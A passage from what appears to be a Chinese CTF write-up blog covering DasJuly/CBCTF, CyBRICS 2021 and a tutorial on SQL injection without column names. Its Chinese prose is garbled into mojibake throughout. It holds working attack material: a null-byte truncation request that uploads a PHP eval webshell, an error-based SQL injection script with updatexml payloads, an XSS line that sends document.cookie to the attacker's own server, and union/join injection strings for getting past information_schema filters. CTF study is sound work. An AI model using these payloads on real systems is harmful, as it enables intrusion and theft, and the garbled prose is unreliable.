ç…§ç‰‡å¹¶æäº¤ç»™qbl.phpï¼Œç„¶åè·³è½¬åˆ°ä¸Šè¾¹å¡«å†™çš„é“¾æ¥ã€‚\næŠŠä¸Šè¾¹çš„ä¸²èµ·æ¥ï¼Œè¿™ä¸ªç½‘ç«™å°±æ˜¯ä¸€ä¸ªé’“é±¼çš„åå°ï¼Œç”Ÿæˆé’“é±¼é“¾æ¥ï¼Œå½“å—å®³è€…ç‚¹å‡»ç”Ÿæˆçš„é“¾æ¥å¹¶ä¸”ç»™äº†æ‘„åƒå¤´æƒé™ä¹‹åå°±å¯ä»¥æ‹åˆ°å—å®³è€…çš„ç…§ç‰‡å¹¶è¿”å›ç»™åå°ã€‚\nè¿™ä¸ªqbl.phpå°±æ˜¯æ¥å—ç…§ç‰‡å¹¶å¤„ç†è·³è½¬çš„phpï¼Œå› ä¸ºåå­—èµ·çš„æŒºå¥‡æ€ªçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±ç›´æ¥å»googleå®ƒï¼Œç„¶åå‘ç°ç½‘ä¸Šæœ‰æºç ï¼š\né“¾æ¥ï¼šåœ¨å—å®è´ï¼Ÿä½ ç‚¹å¼€è¿™ä¸ªç½‘å€çœ‹çœ‹ã€æ‰“å¼€ç½‘ç«™å·æ‹ç…§ç‰‡ã€‘] - çŸ¥ä¹ (zhihu.com)\nqbl.phpï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 \u0026lt;?php error_reporting(0); $base64_img = trim($_POST[\u0026#39;img\u0026#39;]); $id = trim($_GET[\u0026#39;id\u0026#39;]); $url = trim($_GET[\u0026#39;url\u0026#39;]); $up_dir = \u0026#39;./img/\u0026#39;;//å­˜æ”¾åœ¨å½“å‰ç›®å½•çš„imgæ–‡ä»¶å¤¹ä¸‹ if(empty($id) || empty($url) || empty($base64_img)){ exit; } if(!file_exists($up_dir)){ mkdir($up_dir,0777); } if(preg_match(\u0026#39;/^(data:\\s*image\\/(\\w+);base64,)/\u0026#39;, $base64_img, $result)){ $type = $result[2]; if(in_array($type,array(\u0026#39;bmp\u0026#39;,\u0026#39;png\u0026#39;))){ $new_file = $up_dir.$id.\u0026#39;_\u0026#39;.date(\u0026#39;mdHis_\u0026#39;).\u0026#39;.\u0026#39;.$type; file_put_contents($new_file, base64_decode(str_replace($result[1], \u0026#39;\u0026#39;, $base64_img))); header(\u0026#34;Location: \u0026#34;.$url); } } ?\u0026gt; æ³¨æ„åˆ°æœåŠ¡å™¨çš„phpç‰ˆæœ¬æ˜¯5.2.17ï¼Œå¯¹ä»£ç è¿›è¡Œå®¡è®¡ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨idå¤„åˆ©ç”¨00æˆªæ–­ï¼Œå°†åè¾¹çš„pngåç¼€å»æ‰ï¼Œä»è€Œä¸Šä¼ shellï¼Œpayloadï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 POST /qbl.php?id=shell.php%00a\u0026amp;url=http://baidu.com HTTP/1.1 Host: node4.buuoj.cn:27340 Content-Length: 106 Cache-Control: max-age=0 Sec-Ch-Ua: \u0026#34;Chromium\u0026#34;;v=\u0026#34;91\u0026#34;, \u0026#34; Not;A Brand\u0026#34;;v=\u0026#34;99\u0026#34; Sec-Ch-Ua-Mobile: ?0 Upgrade-Insecure-Requests: 1 Origin: https://node4.buuoj.cn:27340 Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Sec-Fetch-Site: same-origin Sec-Fetch-Mode: navigate Sec-Fetch-Dest: document Referer: https://node4.buuoj.cn:27340/sc.php?id=1\u0026amp;url=http://baidu.com Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close img=data%3Aimage%2Fpng%3Bbase64%2CPD9waHAgaGlnaGxpZ2h0X2ZpbGUoX19GSUxFX18pO0BldmFsKCRfUE9TVFtrMXRlXSk7Pz4= å›¾ç‰‡ä¼šæ”¾åœ¨imgç›®å½•ä¸‹ï¼Œç›´æ¥å»æ‰¾å°±è¡Œ:\nMisc Just a GIF å°†gifé€å¸§åˆ†è§£ä¹‹åå‘ç°å¾ˆå¤šå†—ä½™å›¾ç‰‡ï¼Œæ¯11å¼ ä¸€ä¸ªå¾ªç¯ï¼Œé‚å†™è„šæœ¬çœ‹çœ‹é‚£äº›åœ°æ–¹ä¸åŒï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 import os from PIL import Image if __name__ == \u0026#34;__main__\u0026#34;: # gifé€å¸§åˆ†è§£ im = Image.open(\u0026#39;Just_a_GIF.gif\u0026#39;) if not os.path.exists(\u0026#39;src\u0026#39;): os.mkdir(\u0026#39;src\u0026#39;) count = 0 try: while True: im.seek(count) im.save(\u0026#39;src/\u0026#39; + str(count) + \u0026#39;.png\u0026#39;) count = count + 1 except: pass print(\u0026#39;å¸§æ•°\u0026#39; + str(count)) # æ‰¾ä¸åŒ if not os.path.exists(\u0026#39;result\u0026#39;): os.mkdir(\u0026#39;result\u0026#39;) rows = 119 cols = 83 for column in range(11): result = Image.new(\u0026#39;RGBA\u0026#39;,(rows,cols),\u0026#39;black\u0026#39;) for row in range(1,41): origin = Image.open(f\u0026#34;src/{column}.png\u0026#34;).convert(\u0026#39;RGBA\u0026#39;).load() diff = Image.open(f\u0026#34;src/{row*11+column}.png\u0026#34;).convert(\u0026#39;RGBA\u0026#39;).load() for x in range(rows): for y in range(cols): if origin[x,y] != diff[x,y]: result.putpixel((x,y),(255,255,255,255)) result.save(f\u0026#39;result/{column+1}.png\u0026#39;) å¾—åˆ°è‹¥å¹²é•¿å¾—åƒäºŒç»´ç çš„å›¾ç‰‡ä»¥åŠä¸¤å¼ é¡ºåºå›¾ï¼Œå¾ˆæ˜æ˜¾æ˜¯è´´èµ·æ¥äº†ï¼Œä½†æ˜¯å›¾ç‰‡å³è¾¹æœ‰é»‘è¾¹ï¼Œå…ˆåˆ‡æ‰å†æ‹¼æ¥ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 from PIL import Image images = [] flag = Image.new(\u0026#39;RGB\u0026#39;,(83*3,83*3)) for i in range(1,10): im = Image.open(f\u0026#34;result/{i}.png\u0026#34;) images.append(im.crop((0,0,83,83))) order = [ [7,1,6], [9,3,4], [5,2,8] ] for row in range(3): for col in range(3): index = order[row][col] flag.paste(images[index-1],(col*83,row*83)) # flag.show() flag.save(\u0026#39;flag.png\u0026#39;) æ˜¯ä¸ªDataMatrixï¼Œç›´æ¥è¯†åˆ«å³å¯\nå†™åœ¨æœ€å å…¶å®ä¸èƒ½è¯´é¢˜ç›®è´¨é‡ä¸è¡Œï¼Œåªæ˜¯å› ä¸ºæ¯”èµ›çš„æ—¶å€™æ—¶é—´ç´§ï¼Œæ‰€ä»¥å°±åªèƒ½ç›´æ¥æ‹¿ç½‘ä¸Šçš„payloadæ‰“ï¼Œä½†æ˜¯èµ›åå†æ¥çœ‹çœ‹ï¼Œç…§ç€ç½‘ä¸Šçš„æ–‡ç« ï¼Œä¸€ä¸ªå‡½æ•°ä¸€ä¸ªå‡½æ•°è·Ÿè¿›ï¼Œè¿˜æ˜¯èƒ½å­¦åˆ°å¾ˆå¤šä¸œè¥¿çš„ã€‚\n","date":"2021-08-03T10:42:08+08:00","permalink":"https://k1te.cn/p/dasjuly-x-cbctf-4th-%E9%83%A8%E5%88%86wp/","title":"DasJuly X CBCTF 4th éƒ¨åˆ†wp"},{"content":"å…¨ç¨‹è¢«é˜Ÿå‹ä»¬å¸¦é£ï¼Œè™½ç„¶æœ€åçš„æˆç»©è‚¯å®šæ¯”ä¸ä¸Šå¤§ä½¬ä»¬çš„æˆ˜é˜Ÿï¼Œä½†è¿˜æ˜¯ç©çš„å¾ˆå¼€å¿ƒ\nWeb Ad Network å·¦ä¸Šè§’æœ‰ä¸€å¼ å›¾ç‰‡ï¼Œç‚¹å‡»ä¹‹åä¼šä¸åœåœ°é‡å®šå‘ï¼Œæˆ‘ä»¬åªéœ€è¦ä¿®æ”¹æµè§ˆå™¨çš„é‡å®šå‘æ¬¡æ•°ï¼Œç„¶åè®©æµè§ˆå™¨ä¸€ç›´è·³å°±å¯ä»¥äº†ï¼š\nAnnouncement æ³¨å…¥ç‚¹åœ¨emailå¤„ï¼Œinsertæ³¨å…¥ï¼Œå·¦è¾¹çš„digestæ˜¯emailçš„md5ï¼š\nç®€å•çš„æŠ¥é”™æ³¨å…¥ï¼Œå› ä¸ºä¸æƒ³é¢‘ç¹ç®—md5ï¼Œäºæ˜¯å†™äº†ä¸ªè„šæœ¬:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 import requests import hashlib import re session = requests.Session() def genearteMD5(str): # åˆ›å»ºmd5å¯¹è±¡ hl = hashlib.md5() # Tips # æ­¤å¤„å¿…é¡»å£°æ˜encode # å¦åˆ™æŠ¥é”™ä¸ºï¼šhl.update(str) Unicode-objects must be encoded before hashing hl.update(str.encode(encoding=\u0026#39;utf-8\u0026#39;)) return hl.hexdigest() # æ•°æ®åº“ announcement payload = \u0026#34;1\u0026#39;or updatexml(1,concat(0x7e,(database()),0x7e),1) or\u0026#39;\u0026#34; # è¡¨ emails,logs payload = \u0026#34;\u0026#39;or updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=\u0026#39;announcement\u0026#39;),0x7e),0) or\u0026#39;\u0026#34; # åˆ— log payload = \u0026#34;\u0026#39;or updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=\u0026#39;logs\u0026#39;),0x7e),0) or\u0026#39;\u0026#34; # å†…å®¹ cybrics{1N53r7_0ld_900d_5ql} payload = \u0026#34;\u0026#39;or updatexml(1,concat(0x7e,(select group_concat(log) from logs),0x7e),0) or\u0026#39;\u0026#34; print(\u0026#34;payload: \u0026#34;+payload) captcha = genearteMD5(payload) print(captcha) paramsPost = {\u0026#34;digest\u0026#34;:captcha,\u0026#34;email\u0026#34;:payload} headers = {\u0026#34;Origin\u0026#34;:\u0026#34;http://announcement-cybrics2021.ctf.su\u0026#34;,\u0026#34;Cache-Control\u0026#34;:\u0026#34;max-age=0\u0026#34;,\u0026#34;Accept\u0026#34;:\u0026#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\u0026#34;,\u0026#34;Upgrade-Insecure-Requests\u0026#34;:\u0026#34;1\u0026#34;,\u0026#34;User-Agent\u0026#34;:\u0026#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36\u0026#34;,\u0026#34;Referer\u0026#34;:\u0026#34;http://announcement-cybrics2021.ctf.su/\u0026#34;,\u0026#34;Connection\u0026#34;:\u0026#34;close\u0026#34;,\u0026#34;Accept-Encoding\u0026#34;:\u0026#34;gzip, deflate\u0026#34;,\u0026#34;Accept-Language\u0026#34;:\u0026#34;zh-CN,zh;q=0.9\u0026#34;,\u0026#34;Content-Type\u0026#34;:\u0026#34;application/x-www-form-urlencoded\u0026#34;} response = session.post(\u0026#34;http://announcement-cybrics2021.ctf.su/\u0026#34;, data=paramsPost, headers=headers) try: print(re.search(\u0026#34;XPATH syntax error: \u0026#39;(.*?)\u0026#39;\u0026#34;,response.text).group()) except: print(response.text) Multichat ç‚¹å¼€ä¹‹åä¸€ä¸ªç½‘ç»œèŠå¤©ç•Œé¢ï¼Œå¯ä»¥åŠ å…¥ä¸åŒçš„roomï¼Œæ ¹æ®é¢˜ç›®æè¿°ï¼Œæˆ‘ä»¬éœ€è¦æ‰¾åˆ°tech supportå’Œadminæ‰€åœ¨çš„æˆ¿é—´å·ï¼Œç„¶åå‘adminå‘é€ä¸€æ®µæ–‡å­—å³å¯ï¼Œæ‰€ä»¥ç°åœ¨çš„é—®é¢˜å°±æ˜¯å¦‚ä½•æ‰¾åˆ°è¿™ä¸ªæˆ¿é—´å·ï¼Œæˆ¿é—´å·çš„èŒƒå›´ç‰¹åˆ«å¤§ï¼Œçˆ†ç ´æ˜¯ä¸å¯èƒ½çˆ†ç ´çš„äº†ï¼Œè¿˜æœ‰ä¸€ä¸ªæŠ€æœ¯æ”¯æŒç•Œé¢è·‘åœ¨5000ç«¯å£ï¼Œç‚¹å‡»ç”µè¯å›¾æ ‡å³å¯è·³è½¬ã€‚\nè¯´å®è¯ä¸æ˜¯å¾ˆæ‡‚ä¸ºä»€ä¹ˆæŠ€æœ¯æ”¯æŒè¦å¡«urlï¼Œä½†æ˜¯é¢˜å°±è¿™ä¹ˆå‡ºçš„ï¼Œåˆšå¼€å§‹å°è¯•è‡ªå·±çš„vpsï¼Œä½†æ˜¯ä¸€ç›´æ²¡æœ‰logï¼Œç„¶ååˆå°è¯•å¡«äº†xsså¹³å°çš„urlï¼Œè¿˜æ˜¯ä¸è¡Œï¼Œæœ€åå¡«äº†pipedreamçš„æ‰ç»ˆäºå¯ä»¥ã€‚ç„¶åèµ›åå¬é˜Ÿå‹åˆ†äº«çš„æ—¶å€™å‘ç°å¤§å®¶éƒ½æœ‰å‘é€æˆåŠŸçš„å›æ˜¾ï¼Œè€Œæˆ‘è™½ç„¶èƒ½æ”¶åˆ°è¯·æ±‚ï¼Œä½†æ˜¯é¡µé¢ç›´æ¥æ˜¯502ã€‚ã€‚ã€‚è‡ªé—­ã€‚ã€‚ã€‚æ¥ç€ä¹Ÿä¸çŸ¥é“è¯¥å¦‚ä½•æµ‹è¯•ï¼Œåé¢é—®äº†é˜Ÿå‹æ‰çŸ¥é“å¯ä»¥ä½¿ç”¨javascript:ï¼Œç„¶åå°±å»googleäº†ä¸€ä¸‹ï¼Œæ‰¾åˆ°äº†ä¸€ä¸ªæœ‰ç‚¹å…³è”çš„ï¼šCall Javascript function from URL/address bar - Stack Overflowï¼Œè¿˜æœ‰ç¯‡åšå®¢ï¼šä¸€ä¸ªç¥å¥‡çš„Javascriptè¿è¡Œæ–¹å¼\u0026ndash;URLä¸­çš„JavaScript - ç¨‹åºå‘˜æœ€åéƒ½è¦é€å¤–å– - åšå®¢å›­ (cnblogs.com)ã€‚å¤§æ¦‚æ„æ€å°±æ˜¯åœ¨æµè§ˆå™¨çš„åœ°å€æ ä¸­è¾“å…¥å½¢å¦‚ï¼šjavascript:XXXçš„è¯­å¥çš„æ—¶å€™ï¼Œæµè§ˆå™¨ä¼šæŠŠåé¢çš„xxxå½“ä½œjsæ‰§è¡Œã€‚è¿™ç§æ–¹æ³•åªä¼šè¢«æµè§ˆå™¨è§£é‡Šï¼Œå…¶ä»–çš„curlä¹‹ç±»çš„å¥½åƒä¸è¡Œï¼Œæ‰€ä»¥çŒœæµ‹åå°æœ‰ä¸ªbotæ¨¡æ‹Ÿtech supportæŠŠæˆ‘ä»¬çš„urlè´´åˆ°æµè§ˆå™¨è·‘ï¼Ÿ\næ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä½¿ç”¨payloadï¼šjavascript:location.href='http://vps/?'+document.cookieæ¥æŠŠcookieå¸¦å‡ºæ¥ã€‚\nç„¶åå¾—åˆ°æˆ¿é—´å·æ‹¿flagï¼š\nCyber and rebyC Mic Check ç­¾åˆ°å…¶å®æŒºæœ‰æ„æ€çš„ï¼Œå¯¹å‰ç«¯ä¸æ˜¯å¾ˆç†Ÿæ‚‰ï¼Œå…·ä½“ä¸æ˜¯å¾ˆæ¸…æ¥šæ€ä¹ˆå®ç°çš„ï¼Œæ•ˆæœå°±æ˜¯è¿™æ®µæ–‡å­—çœ‹èµ·æ¥æ˜¯flagï¼Œä½†æ˜¯ç›´æ¥å¤åˆ¶çš„è¯æ˜¯å¦ä¸€æ®µå‡çš„flagï¼Œä¸è¿‡èµ›åæ²¡äº†ï¼Œä¸ç„¶è¿˜èƒ½ç ”ç©¶ç ”ç©¶ã€‚\nScanner æŒºå¥½ç©çš„ä¸€é“é¢˜ï¼Œç”¨ä¸€å¼ åŠ¨å›¾æ¨¡æ‹Ÿæ‰«æï¼Œç„¶åè®©ä½ è®¤å‡ºè¿™æ˜¯å•¥ï¼Œä¾‹å¦‚è¿™ä¸ªå°æˆ¿å­ï¼š\næ€è·¯å…¶å®ä¹Ÿå¾ˆç®€å•ï¼Œåªéœ€è¦æŠŠgifä¸€å¸§ä¸€å¸§æ‹†æˆpngç„¶åå†è´´èµ·æ¥å³å¯ï¼Œè€ƒè™‘åˆ°ï¼Œç›´æ¥è´´èµ·æ¥å¯èƒ½ä¼šæœ‰é‡å¤çš„éƒ¨åˆ†ï¼Œé€šè¿‡è§‚å¯Ÿå¤§æ¦‚æ¯éš”ä¸€å¼ è´´èµ·æ¥æ¯”è¾ƒåˆé€‚ï¼Œç”¨pillowåº“å†™äº†ä¸ªè„šæœ¬ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 import os from PIL import Image import requests if __name__ == \u0026#34;__main__\u0026#34;: # å°†gifåˆ†è§£æˆpng im = Image.open(\u0026#39;vid.gif\u0026#39;) os.mkdir(\u0026#39;src\u0026#39;) count = 0 try: while True: im.seek(count) im.save(\u0026#39;src/\u0026#39; + str(count) + \u0026#39;.png\u0026#39;) count = count + 1 except: pass print(\u0026#39;å¸§æ•°\u0026#39; + str(count)) # å°†æ¯å¼ pngåˆèµ·æ¥ target = Image.new(\u0026#39;RGB\u0026#39;,(1080,1606)) # æ¯éš”ä¸€å¼ å›¾ç‰‡ï¼Œæˆªå–ä¸€å®šçš„éƒ¨åˆ†ï¼Œå¹¶ä¸”æ‹¼æ¥èµ·æ¥ for i in range(0,145,2): img = Image.open(\u0026#39;src/\u0026#39;+ str(i) +\u0026#39;.png\u0026#39;) cropped = img.crop((0,496,1080,517)) target.paste(cropped,(0,i*11)) target.save(\u0026#34;vid.png\u0026#34;) å…¶å®å‰å››ä¸ªæ˜¯è‚‰çœ¼çœ‹å‡ºæ¥çš„ï¼Œç„¶åç¬¬äº”ä¸ªçœ‹ä¸å‡ºæ¥äº†ï¼Œå†™äº†ä¸ªè„šæœ¬æ‰å‘ç°æ˜¯ä¸ªäºŒç»´ç ï¼Œæœ€åæ‰«ç å³å¯å¾—åˆ°flagï¼š\nCAPTCHA The Flag åˆšå¼€å§‹æ²¡ä»”ç»†çœ‹ï¼Œå±…ç„¶ä¸çŸ¥é“è¯¥å’‹åšã€‚ã€‚ã€‚å…¶å®å¾ˆç®€å•ï¼Œåªéœ€è¦æŠŠå›¾ç‰‡æ‰’æ‹‰ä¸‹æ¥ï¼Œç„¶åç”¨StegSolveæ‰“å¼€ï¼Œè°ƒåˆ°ç‰¹å®šçš„é€šé“å³å¯ã€‚\n","date":"2021-07-26T14:42:08+08:00","permalink":"https://k1te.cn/p/cybrics2021/","title":"CyBRICS2021"},{"content":"ctfæ— åˆ—åæ³¨å…¥å°ç»“ å…¶å®ä¹‹å‰ä¹Ÿé‡åˆ°è¿‡ç±»ä¼¼çš„é¢˜ç›®ï¼Œä½†æ˜¯æ‹–å»¶ç—‡å¤ªä¸¥é‡äº†ï¼Œä¸€ç›´æ²¡æœ‰ä»”ç»†ç ”ç©¶ï¼Œæ­£å¥½è¿™æ¬¡å›½èµ›åˆèµ›ä¹Ÿæœ‰ä¸€é“æ— åˆ—åæ³¨å…¥çš„é¢˜ç›®ï¼Œå¥½å¥½å­¦ä¹ ä¸€ä¸‹ã€‚\næ— åˆ—åæ³¨å…¥ä¸€èˆ¬ä¼´éšç€bypass information_schemaï¼Œå½“è¿™ä¸ªè¡¨è¢«è¿‡æ»¤çš„æ—¶å€™ï¼Œæˆ‘ä»¬åªèƒ½ä½¿ç”¨sys.schema_auto_increment_columnsã€sys.schema_table_statistics_with_bufferã€mysql.innodb_table_statsç­‰ç­‰è¿›è¡Œç»•è¿‡ï¼Œä½†æ˜¯è¿™äº›è¡¨ä¸­ä¸€èˆ¬éƒ½æ²¡æœ‰å­—æ®µåï¼Œåªèƒ½è·å¾—è¡¨åï¼Œæ‰€ä»¥å½“æˆ‘ä»¬çŸ¥é“è¡¨æ˜ä¹‹åï¼Œè¿˜éœ€è¦è¿›ä¸€æ­¥åœ°ä½¿ç”¨æ— åˆ—åæ³¨å…¥\nä¸€ã€åˆ—åé‡å¤ï¼ˆjoinâ€¦â€¦usingï¼‰ æ¡ä»¶ï¼šéœ€è¦å¼€å¯æŠ¥é”™\nç›´æ¥æ‹¿sqli-labsçš„emailè¡¨æ¥åšæ¼”ç¤ºï¼ˆåé¢ä¹Ÿä¼šä½¿ç”¨è¿™ä¸ªè¡¨ï¼‰ï¼š\nå‡è®¾æˆ‘ä»¬å·²ç»bypassäº†information_schemaå¹¶ä¸”è·å¾—äº†emailsè¿™ä¸ªè¡¨åï¼Œè¿™æ—¶å€™æˆ‘ä»¬å¯ä»¥ä½¿ç”¨?id=1' union select * from (select * from emails a join emails b)c--+dumpå‡ºç¬¬ä¸€ä¸ªå­—æ®µåï¼š\nç´§æ¥ç€ä½¿ç”¨?id=1' union select * from (select * from emails a join emails b using(id))c--+dumpå‡ºç¬¬äºŒä¸ªå­—æ®µåï¼š\nä¸€èˆ¬ç½‘ä¸Šçš„æ–‡ç« åˆ°è¿™é‡Œå°±ç»“æŸäº†ï¼Œä½†æ˜¯æä¸æ˜ç™½åŸç†æ˜¯å•¥ï¼ˆå¯èƒ½æ˜¯å› ä¸ºæˆ‘å¤ªèœäº†ï¼‰ï¼Œæ‰€ä»¥è‡ªå·±åˆæ¥ç€å¾€ä¸‹ç ”ç©¶ã€‚\nå½“æˆ‘ä»¬ç»§ç»­ä½¿ç”¨?id=1' union select * from (select * from emails a join emails b using(id,email_id))c--+ï¼Œä¼šæŠ¥åˆ—æ•°ä¸ä¸€è‡´çš„é”™è¯¯ï¼š\nå› ä¸ºè¿™ä¸ªæ—¶å€™å·²ç»selectæˆåŠŸäº†ï¼Œä½†æ˜¯åªæœ‰ä¸¤åˆ—ï¼Œè€Œunionå‰é¢çš„è¯­å¥æœ‰ä¸‰åˆ—ï¼Œæ‰€ä»¥åˆ—æ•°ä¸ä¸€è‡´ï¼Œåœ¨å‘½ä»¤è¡Œé‡Œæ˜¯å¯ä»¥æˆåŠŸselectçš„ï¼š\næˆ–è€…è¿™æ ·ï¼š\næ‰€ä»¥joinâ€¦â€¦usingåˆ°åº•æ˜¯å•¥å‘¢ï¼Œæˆ‘åˆå»Googleäº†ä¸€ä¸‹ï¼šSQL JOIN å­å¥ç”¨äºæŠŠæ¥è‡ªä¸¤ä¸ªæˆ–å¤šä¸ªè¡¨çš„è¡Œç»“åˆèµ·æ¥ï¼ŒåŸºäºè¿™äº›è¡¨ä¹‹é—´çš„å…±åŒå­—æ®µã€‚\njoinæœ‰ä¸åŒçš„ç±»å‹ï¼š\nINNER JOINï¼šå¦‚æœè¡¨ä¸­æœ‰è‡³å°‘ä¸€ä¸ªåŒ¹é…ï¼Œåˆ™è¿”å›è¡Œ LEFT JOINï¼šå³ä½¿å³è¡¨ä¸­æ²¡æœ‰åŒ¹é…ï¼Œä¹Ÿä»å·¦è¡¨è¿”å›æ‰€æœ‰çš„è¡Œ RIGHT JOINï¼šå³ä½¿å·¦è¡¨ä¸­æ²¡æœ‰åŒ¹é…ï¼Œä¹Ÿä»å³è¡¨è¿”å›æ‰€æœ‰çš„è¡Œ FULL JOINï¼šåªè¦å…¶ä¸­ä¸€ä¸ªè¡¨ä¸­å­˜åœ¨åŒ¹é…ï¼Œåˆ™è¿”å›è¡Œ å…¶ä¸­inner join å’Œ joinæ˜¯ç›¸åŒçš„\nsecurityä¸­è¿˜æœ‰ä¸€ä¸ªusersè¡¨å¦‚ä¸‹ï¼š\nå½“æˆ‘ä»¬è·¨è¡¨æŸ¥è¯¢å¯¹åº”ç”¨æˆ·çš„emailçš„æ—¶å€™å°±å¯ä»¥ä½¿ç”¨joinè¯­å¥ï¼Œæœ‰ä»¥ä¸‹ä¸‰ç§å†™æ³•ï¼š\n1 2 3 select * from users join emails on emails.id = users.id; select * from users join emails using(id); select * from users,emails where users.id = emails.id; æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å½“æˆ‘ä»¬ä½¿ç”¨usingçš„æ—¶å€™idè¿™ä¸ªå­—æ®µåªå‡ºç°äº†ä¸€æ¬¡ï¼Œä½†æ˜¯whereå’Œonéƒ½å‡ºç°äº†ä¸¤æ¬¡ï¼Œå¹¶ä¸”ä¸ä¼šæŠ¥é”™ã€‚\nä½†æ˜¯å¦‚æœæˆ‘ä»¬åœ¨å¤–è¾¹å¥—ä¸€å±‚selectï¼Œæƒ…å†µå°±ä¸ä¸€æ ·äº†\n1 2 3 select * from (select * from users join emails on emails.id = users.id)a; select * from (select * from users join emails using(id))a; select * from (select * from users,emails where users.id = emails.id)a; å¯ä»¥çœ‹åˆ°åªæœ‰usingä¸ä¼šæŠ¥é”™ï¼Œå…¶ä»–ä¸¤ä¸ªéƒ½æŠ¥äº†åˆ—åé‡å¤çš„é”™è¯¯ï¼Œå¹¶ä¸”æŒ‡å‡ºäº†å…·ä½“çš„åˆ—å\nå‡è®¾æˆ‘ä»¬ä¸çŸ¥é“ä»»ä½•åˆ—åï¼ŒæŠŠåé¢çš„onã€usingã€whereéƒ½åˆ æ‰ï¼š\néƒ½å¯ä»¥çˆ†å‡ºç¬¬ä¸€ä¸ªå­—æ®µï¼ˆè™½ç„¶è¯´åˆ äº†ä¹‹åå‰é¢æ²¡æœ‰åŒºåˆ«ï¼‰ï¼Œä½†æ˜¯å½“æˆ‘ä»¬çŸ¥é“äº†ç¬¬ä¸€ä¸ªå­—æ®µï¼Œæƒ³è¦çˆ†å‡ºç¬¬äºŒä¸ªå­—æ®µçš„æ—¶å€™ï¼Œç»“æœå°±ä¸ä¸€æ ·äº†ã€‚ï¼ˆå› ä¸ºemailå’Œuseråªæœ‰ä¸€ä¸ªåˆ—åé‡å¤ï¼Œæ‰€ä»¥joinä¸¤ä¸ªä¸€æ ·çš„è¡¨ï¼ˆä¸€èˆ¬éƒ½joinä¸€æ ·çš„è¡¨ï¼‰ï¼ŒåŒæ—¶è¿˜éœ€è¦ç»™è¿™ä¸¤ä¸ªè¡¨å–ä¸¤ä¸ªåˆ«åï¼Œä¸ç„¶ä¼šæŠ¥è¡¨åä¸å”¯ä¸€çš„é”™è¯¯:Not unique table/alias: 'emails'ï¼‰ï¼š\n1 2 3 4 5 6 select * from (select * from emails a join emails b on a.id = b.id)a; \u0026gt;\u0026gt; ERROR 1060 (42S21): Duplicate column name \u0026#39;id\u0026#39; select * from (select * from emails a join emails b using(id))a; \u0026gt;\u0026gt; ERROR 1060 (42S21): Duplicate column name \u0026#39;email_id\u0026#39; select * from (select * from emails a,emails b where a.id = b.id)a; \u0026gt;\u0026gt; ERROR 1060 (42S21): Duplicate column name \u0026#39;id\u0026#39; å¯ä»¥çœ‹åˆ°ï¼Œåªæœ‰usingå¯ä»¥dumpå‡ºç¬¬äºŒä¸ªå­—æ®µï¼ŒåŸå› æƒ³å¿…å¤§å®¶çœ‹åˆ°è¿™é‡Œéƒ½æ˜ç™½äº†ï¼Œå³ä¾¿æˆ‘ä»¬æŒ‡å®šäº†whereå’Œonï¼Œselectå‡ºæ¥çš„è¡¨ä¾ç„¶æœ‰é‡å¤çš„å­—æ®µï¼Œä½†æ˜¯usingä¸ä¼šï¼Œæ‰€ä»¥ç¬¬ä¸€ä¸ªå’Œç¬¬ä¸‰ä¸ªæŒ‡ä»¤ä¾ç„¶æŠ¥é”™idå­—æ®µé‡å¤ï¼Œè€Œç¬¬äºŒæ¡æŒ‡ä»¤åˆ™å¼€å§‹æŠ¥å‰©ä¸‹çš„å­—æ®µçš„åå­—ã€‚\näºŒã€é€šè¿‡åˆ«åï¼Œå¼•ç”¨åˆ—åï¼ˆéœ€è¦ä½¿ç”¨unionï¼‰ æ¡ä»¶ï¼šæœ‰æŸ¥è¯¢å†…å®¹å›æ˜¾\n2021å›½èµ›åˆèµ›çš„easy_sqlä¹‹æ‰€ä»¥ä¸ä½¿ç”¨è¿™ä¸ªæ–¹æ³•ï¼Œæ˜¯å› ä¸ºunionè¢«è¿‡æ»¤äº†ï¼Œæ‰€ä»¥è¿™ä¹Ÿæ˜¯ä¸€ä¸ªæ¡ä»¶å§ã€‚\nå‡è®¾æˆ‘ä»¬ä¸çŸ¥é“emailsçš„å­—æ®µåï¼Œæˆ‘ä»¬å¯ä»¥å°†ä»–çš„åˆ—åè½¬åŒ–ä¸ºåˆ«åï¼šselect 1,2 union select * from emails;\nç„¶åæˆ‘ä»¬å¯ä»¥å¼•ç”¨è¿™ä¸ªæˆ‘ä»¬å·²çŸ¥çš„åˆ«åæ¥è·å¾—æ•°æ®ï¼šselect 2 from (select 1,2 union select * from emails)x;ï¼š\nå½“åå¼•å·è¢«bançš„æ—¶å€™å¯ä»¥ä½¿ç”¨åˆ«åï¼šselect a from (select 1,2 a union select * from emails)x;(çœç•¥äº†as)\næˆ–è€…ä½¿ç”¨åŒå¼•å·ï¼šselect a from (select 1,\u0026quot;a\u0026quot; union select * from emails)x;\nåœ¨sqli-labä¸­çš„æ¼”ç¤ºï¼š\nä¸‰ã€æ¯”è¾ƒç›²æ³¨ 